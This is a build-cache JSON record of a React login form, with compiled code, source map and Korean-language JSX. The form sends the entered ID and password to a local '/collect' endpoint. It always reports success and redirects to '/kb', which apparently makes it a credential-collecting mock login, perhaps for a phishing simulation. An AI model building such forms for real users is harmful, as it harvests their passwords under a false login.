{"ast":null,"code":"var _jsxFileName = \"C:\\\\Users\\\\user\\\\Desktop\\\\LLM hallucination\\\\nomppi-hundeugi-spa2\\\\src\\\\components\\\\LoginForm.jsx\";\nimport React from 'react';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst LoginForm = ({\n  userId,\n  setUserId,\n  password,\n  setPassword,\n  setToast,\n  setLoading\n}) => {\n  const handleSubmit = async e => {\n    e.preventDefault();\n    if (!userId || !password) {\n      setToast('아이디와 비밀번호를 입력해주게');\n      return;\n    }\n    setLoading(true);\n    setToast('로그인 시도 중입주다...');\n    try {\n      await fetch('http://localhost:5000/collect', {\n        method: 'POST',\n        body: new URLSearchParams({\n          userid: userId,\n          password\n        })\n      });\n      setToast('로그인 완료되었수다!');\n      setTimeout(() => {\n        window.location.href = '/kb';\n      }, 1500);\n    } catch (err) {\n      setToast('서버 연결 실패했수다!');\n    }\n    setLoading(false);\n  };\n  return /*#__PURE__*/_jsxDEV(\"form\", {\n    onSubmit: handleSubmit,\n    className: \"login-form\",\n    children: [/*#__PURE__*/_jsxDEV(\"input\", {\n      type: \"text\",\n      placeholder: \"\\uC544\\uC774\\uB514\",\n      value: userId,\n      onChange: e => setUserId(e.target.value)\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 34,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n      type: \"password\",\n      placeholder: \"\\uBE44\\uBC00\\uBC88\\uD638\",\n      value: password,\n      onChange: e => setPassword(e.target.value)\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 40,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n      type: \"submit\",\n      children: \"\\uB4E4\\uC5B4\\uAC00\\uAE30\"\n    }, void 0, false, {\n      fileName: _jsxFileName,\n      lineNumber: 46,\n      columnNumber: 7\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 33,\n    columnNumber: 5\n  }, this);\n};\n_c = LoginForm;\nexport default LoginForm;\nvar _c;\n$RefreshReg$(_c, \"LoginForm\");","map":{"version":3,"names":["React","jsxDEV","_jsxDEV","LoginForm","userId","setUserId","password","setPassword","setToast","setLoading","handleSubmit","e","preventDefault","fetch","method","body","URLSearchParams","userid","setTimeout","window","location","href","err","onSubmit","className","children","type","placeholder","value","onChange","target","fileName","_jsxFileName","lineNumber","columnNumber","_c","$RefreshReg$"],"sources":["C:/Users/user/Desktop/LLM hallucination/nomppi-hundeugi-spa2/src/components/LoginForm.jsx"],"sourcesContent":["import React from 'react';\r\n\r\nconst LoginForm = ({ userId, setUserId, password, setPassword, setToast, setLoading }) => {\r\n  const handleSubmit = async (e) => {\r\n    e.preventDefault();\r\n\r\n    if (!userId || !password) {\r\n      setToast('아이디와 비밀번호를 입력해주게');\r\n      return;\r\n    }\r\n\r\n    setLoading(true);\r\n    setToast('로그인 시도 중입주다...');\r\n\r\n    try {\r\n      await fetch('http://localhost:5000/collect', {\r\n        method: 'POST',\r\n        body: new URLSearchParams({ userid: userId, password }),\r\n      });\r\n\r\n      setToast('로그인 완료되었수다!');\r\n      setTimeout(() => {\r\n        window.location.href = '/kb';\r\n      }, 1500);\r\n    } catch (err) {\r\n      setToast('서버 연결 실패했수다!');\r\n    }\r\n\r\n    setLoading(false);\r\n  };\r\n\r\n  return (\r\n    <form onSubmit={handleSubmit} className=\"login-form\">\r\n      <input\r\n        type=\"text\"\r\n        placeholder=\"아이디\"\r\n        value={userId}\r\n        onChange={(e) => setUserId(e.target.value)}\r\n      />\r\n      <input\r\n        type=\"password\"\r\n        placeholder=\"비밀번호\"\r\n        value={password}\r\n        onChange={(e) => setPassword(e.target.value)}\r\n      />\r\n      <button type=\"submit\">들어가기</button>\r\n    </form>\r\n  );\r\n};\r\n\r\nexport default LoginForm;\r\n"],"mappings":";AAAA,OAAOA,KAAK,MAAM,OAAO;AAAC,SAAAC,MAAA,IAAAC,OAAA;AAE1B,MAAMC,SAAS,GAAGA,CAAC;EAAEC,MAAM;EAAEC,SAAS;EAAEC,QAAQ;EAAEC,WAAW;EAAEC,QAAQ;EAAEC;AAAW,CAAC,KAAK;EACxF,MAAMC,YAAY,GAAG,MAAOC,CAAC,IAAK;IAChCA,CAAC,CAACC,cAAc,CAAC,CAAC;IAElB,IAAI,CAACR,MAAM,IAAI,CAACE,QAAQ,EAAE;MACxBE,QAAQ,CAAC,kBAAkB,CAAC;MAC5B;IACF;IAEAC,UAAU,CAAC,IAAI,CAAC;IAChBD,QAAQ,CAAC,gBAAgB,CAAC;IAE1B,IAAI;MACF,MAAMK,KAAK,CAAC,+BAA+B,EAAE;QAC3CC,MAAM,EAAE,MAAM;QACdC,IAAI,EAAE,IAAIC,eAAe,CAAC;UAAEC,MAAM,EAAEb,MAAM;UAAEE;QAAS,CAAC;MACxD,CAAC,CAAC;MAEFE,QAAQ,CAAC,aAAa,CAAC;MACvBU,UAAU,CAAC,MAAM;QACfC,MAAM,CAACC,QAAQ,CAACC,IAAI,GAAG,KAAK;MAC9B,CAAC,EAAE,IAAI,CAAC;IACV,CAAC,CAAC,OAAOC,GAAG,EAAE;MACZd,QAAQ,CAAC,cAAc,CAAC;IAC1B;IAEAC,UAAU,CAAC,KAAK,CAAC;EACnB,CAAC;EAED,oBACEP,OAAA;IAAMqB,QAAQ,EAAEb,YAAa;IAACc,SAAS,EAAC,YAAY;IAAAC,QAAA,gBAClDvB,OAAA;MACEwB,IAAI,EAAC,MAAM;MACXC,WAAW,EAAC,oBAAK;MACjBC,KAAK,EAAExB,MAAO;MACdyB,QAAQ,EAAGlB,CAAC,IAAKN,SAAS,CAACM,CAAC,CAACmB,MAAM,CAACF,KAAK;IAAE;MAAAG,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAC5C,CAAC,eACFhC,OAAA;MACEwB,IAAI,EAAC,UAAU;MACfC,WAAW,EAAC,0BAAM;MAClBC,KAAK,EAAEtB,QAAS;MAChBuB,QAAQ,EAAGlB,CAAC,IAAKJ,WAAW,CAACI,CAAC,CAACmB,MAAM,CAACF,KAAK;IAAE;MAAAG,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAC9C,CAAC,eACFhC,OAAA;MAAQwB,IAAI,EAAC,QAAQ;MAAAD,QAAA,EAAC;IAAI;MAAAM,QAAA,EAAAC,YAAA;MAAAC,UAAA;MAAAC,YAAA;IAAA,OAAQ,CAAC;EAAA;IAAAH,QAAA,EAAAC,YAAA;IAAAC,UAAA;IAAAC,YAAA;EAAA,OAC/B,CAAC;AAEX,CAAC;AAACC,EAAA,GA9CIhC,SAAS;AAgDf,eAAeA,SAAS;AAAC,IAAAgC,EAAA;AAAAC,YAAA,CAAAD,EAAA","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}